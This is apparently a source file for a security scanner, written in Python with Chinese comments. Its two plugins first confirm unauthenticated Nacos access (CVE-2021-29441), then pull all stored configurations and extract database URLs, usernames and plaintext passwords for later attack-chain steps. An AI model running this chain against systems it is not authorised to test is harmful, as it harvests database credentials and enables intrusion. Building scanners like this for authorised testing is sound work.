# 链 3 专用插件：Nacos 未授权 → 配置泄露 → 数据库凭证
#
# 两个原子步骤：
#   1. NacosUnauthPlugin: Nacos 未授权访问验证（extra: nacos_url, accessible）
#   2. NacosConfigExtractPlugin: 拉取配置并提取数据库凭证（extra: db_url, db_username, db_password）
#
# 参考：Nacos 未授权访问漏洞（CVE-2021-29441）默认无需认证即可访问 /nacos/v1/auth/users?pageNo=1&pageSize=1
import json
import re

from common.logger import get_logger
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from plugins.base import PluginBase

logger = get_logger(__name__)


class NacosUnauthPlugin(PluginBase):
    """Nacos 未授权访问验证（链 3 步骤 1）

    检查目标是否暴露 Nacos 服务且存在未授权访问漏洞。
    成功时 extra.nacos_url 存储可访问的 Nacos 地址。
    """

    name = "Nacos未授权访问"
    severity = "high"
    category = "vuln"
    description = "检测 Nacos 服务未授权访问（默认无认证）"
    fix = "Nacos 开启认证，修改默认密钥，限制访问 IP 白名单"

    # Nacos 常见路径前缀
    _NACOS_PATHS = ["/nacos", ""]  # 同端口部署或独立端口

    def verify(self, target, session):
        """探测 Nacos 未授权访问：用户接口与配置接口双确认

        逐前缀检查 /v1/auth/users 与 /v1/cs/configs，两个接口均可读才判定
        未授权（CONFIRMED）；仅有未授权迹象（用户列表可读但配置接口不可读）
        判 UNKNOWN；仅首页可达但接口不可读判定为已开启认证（SAFE）。

        @param target: 扫描目标 URL
        @param session: HTTP 会话（含登录态与 cookie 处理）
        @return: ScanResult；CONFIRMED=未授权可读，SAFE=未发现/已认证，UNKNOWN=网络异常或形态不定
        """
        saw_nacos = False  # 任一路径前缀的 Nacos 首页可达
        saw_user_list_leak = False  # 任一路径前缀的用户列表接口未授权返回用户数据
        for prefix in self._NACOS_PATHS:
            # 检查用户列表接口（未授权访问特征）
            url = join_url(target, f"{prefix}/v1/auth/users?pageNo=1&pageSize=1")
            try:
                resp = session.get(url)
                text = resp.text
            except Exception:
                # 网络/解析失败必须留痕：SAFE 由传输错误导致时与「目标确实安全」不可区分
                logger.debug("Nacos 用户列表接口请求失败: %s", url, exc_info=True)
                continue

            # 未授权特征：返回用户列表 JSON（含 username 字段）且无 403
            if resp.status_code == 200 and self._user_list_leaked(text):
                saw_user_list_leak = True
                # 进一步验证配置接口可访问
                # dataId/group/tenant 全空 = 列出全部配置；pageSize 调小避免响应过大
                config_url = join_url(target, f"{prefix}/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=10")
                try:
                    config_resp = session.get(config_url)
                    if "pageItems" in config_resp.text or "totalCount" in config_resp.text:
                        return ScanResult(
                            kind="chain",
                            name=self.name,
                            severity=self.severity,
                            status=STATUS_CONFIRMED,
                            url=url,
                            evidence="Nacos 未授权访问，用户列表和配置接口可读",
                            fix=self.fix,
                            extra={
                                "nacos_url": join_url(target, prefix),
                                "accessible": True,
                                "vuln_type": "nacos_unauth",
                            },
                        )
                except Exception:
                    logger.debug("Nacos 配置解析失败", exc_info=True)

            # 检查 Nacos 首页可达（但可能需认证）
            home_url = join_url(target, f"{prefix}/")
            try:
                home_resp = session.get(home_url)
            except Exception:
                logger.debug("Nacos 首页请求失败: %s", home_url, exc_info=True)
                continue
            # 不在此处直接返回 SAFE：既避免掩盖其他前缀命中的未授权迹象，
            # 也保证根路径部署（prefix=""）的候选前缀仍会被探测
            if "nacos" in home_resp.text.lower():
                saw_nacos = True

        # 用户列表可读但配置接口不可读：已出现未授权迹象，不能判 SAFE
        if saw_user_list_leak:
            return ScanResult(
                kind="chain",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=target,
                evidence="用户列表接口可未授权读取，但配置接口不可读，无法确证完整未授权，需人工复核",
            )
        if saw_nacos:
            return ScanResult(
                kind="chain",
                name=self.name,
                status=STATUS_SAFE,
                url=target,
                evidence="Nacos 可达但已开启认证",
            )
        return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=target, evidence="未检测到 Nacos 服务")

    @staticmethod
    def _user_list_leaked(text):
        """响应是否为 Nacos 用户列表 JSON（pageItems 中含 username 字段）

        不能用裸子串 "username" 判定：未登录访问任意路径会 302 到登录页，
        登录页 HTML 含 <input name="username">，裸子串会把登录页当成用户列表泄露。
        """
        if not text or "username" not in text:
            return False
        try:
            data = json.loads(text)
        except Exception:
            return False
        items = data.get("pageItems") if isinstance(data, dict) else data
        if not isinstance(items, list):
            return False
        return any(isinstance(item, dict) and "username" in item for item in items)


class NacosConfigExtractPlugin(PluginBase):
    """Nacos 配置提取（链 3 步骤 2）

    从 Nacos 拉取应用配置，正则提取数据库连接信息。
    成功时 extra.db_url / db_username / db_password 存储凭证。
    """

    name = "Nacos配置提取"
    severity = "high"
    category = "vuln"
    description = "从 Nacos 拉取配置并提取数据库凭证"
    fix = "Nacos 配置中的敏感信息加密存储，开启认证和访问控制"

    # 与步骤 1 相同的候选前缀：Nacos 可能部署在 /nacos，也可能直接部署在根路径
    _NACOS_PATHS = ["/nacos", ""]

    @staticmethod
    def _db_scope(content):
        """截取数据库配置文本，避免把 nacos.username 等无关键当作数据库凭证

        1. YAML：取 `datasource:` 键之后缩进更深的连续行（其子树）；
        2. Properties：取所有 `<前缀>datasource.xxx=` 形态的点号键行；
        3. 两者都找不到时退回全文（兼容平铺的 url/username/password 配置）。
        """
        lines = content.splitlines()
        for idx, line in enumerate(lines):
            m = re.match(r"(?i)^(\s*)(?:[\w-]+\.)*datasource\s*:", line)
            if not m:
                continue
            indent = len(m.group(1))
            block = [line]
            for nxt in lines[idx + 1 :]:
                # 空行跳过；缩进不深于 datasource 键即视为子树结束
                if nxt.strip() and (len(nxt) - len(nxt.lstrip())) <= indent:
                    break
                block.append(nxt)
            return "\n".join(block)
        props = [
            ln for ln in lines if re.match(r"(?i)^\s*(?:[\w-]+\.)*datasource\.(?:url|username|password)\s*[:=]", ln)
        ]
        return "\n".join(props) if props else content

    def verify(self, target, session):
        """拉取 Nacos 全量配置，正则提取数据库连接凭证

        逐个候选前缀拉取配置列表，取第一个返回配置结构的响应；内容接口与列表接口
        使用同一前缀，避免根路径部署的 Nacos（prefix=""）在步骤 2 静默失败。

        @param target: 扫描目标 URL
        @param session: HTTP 会话（含登录态与 cookie 处理）
        @return: ScanResult；CONFIRMED=提取到 db 凭证，SAFE=未提取到，UNKNOWN=网络异常
        """
        # 拉取配置列表：逐个前缀尝试，命中配置结构即锁定该前缀
        list_url = ""
        prefix = self._NACOS_PATHS[0]
        configs = []
        got_response = False
        last_err = None
        for cand in self._NACOS_PATHS:
            list_url = join_url(target, f"{cand}/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100")
            try:
                resp = session.get(list_url)
                text = resp.text
            except Exception as e:
                last_err = e
                continue
            got_response = True
            prefix = cand
            try:
                data = json.loads(text)
                configs = data.get("pageItems", []) or []
            except Exception:
                configs = []
            # Nacos 配置列表响应含 pageItems/totalCount；命中即锁定该前缀，无需再试其他前缀
            if "pageItems" in text or "totalCount" in text:
                break

        if not got_response:
            return ScanResult(
                kind="chain", name=self.name, status=STATUS_UNKNOWN, url=list_url, evidence=f"网络异常: {last_err}"
            )

        db_url = ""
        db_username = ""
        db_password = ""

        for cfg in configs:
            data_id = cfg.get("dataId", "")
            group = cfg.get("group", "")
            # 拉取具体配置内容（与列表接口使用同一已锁定的前缀）
            content_url = join_url(target, f"{prefix}/v1/cs/configs?dataId={data_id}&group={group}")
            try:
                content_resp = session.get(content_url)
                content = content_resp.text or ""
            except Exception:
                logger.debug("Nacos 配置内容拉取失败: %s", content_url, exc_info=True)
                continue

            # 正则提取数据库连接信息：先在 datasource 配置块内匹配，避免泛化键
            # （如 nacos.username）串入；url 保留完整 jdbc 串（含 scheme，覆盖
            # mysql/postgresql/oracle/sqlserver 等），并去掉值两侧引号与行尾标点
            scope = self._db_scope(content)
            url_match = re.search(r"(?im)^\s*(?:[\w-]+\.)*url\s*[:=]\s*[\"']?(jdbc:[^\s\"']+)", scope)
            if url_match:
                db_url = url_match.group(1).rstrip(";,")
            user_match = re.search(r"(?im)^\s*(?:[\w-]+\.)*username\s*[:=]\s*[\"']?([^\s\"',;]+)", scope)
            if user_match:
                db_username = user_match.group(1).rstrip(";,")
            pwd_match = re.search(r"(?im)^\s*(?:[\w-]+\.)*password\s*[:=]\s*[\"']?([^\s\"',;]+)", scope)
            if pwd_match:
                db_password = pwd_match.group(1).rstrip(";,")

            # 三个字段（地址+用户名+密码）全部取到才停止遍历，
            # 避免密码在后续配置条目中遗漏（db_password 是链的必需产物）
            if db_url and db_username and db_password:
                break

        if db_url or db_username:
            evidence_parts = []
            if db_url:
                evidence_parts.append(f"数据库地址: {db_url}")
            if db_username:
                evidence_parts.append(f"用户名: {db_username}")
            if db_password:
                # 证据不回显明文密码，仅标记已提取（脱敏规范）
                evidence_parts.append("密码: 已提取（脱敏）")
            return ScanResult(
                kind="chain",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=list_url,
                evidence="; ".join(evidence_parts),
                fix=self.fix,
                extra={
                    "db_url": db_url,
                    "db_username": db_username,
                    "db_password": db_password,
                    "vuln_type": "nacos_config_leak",
                },
            )

        return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=list_url, evidence="未提取到数据库配置")
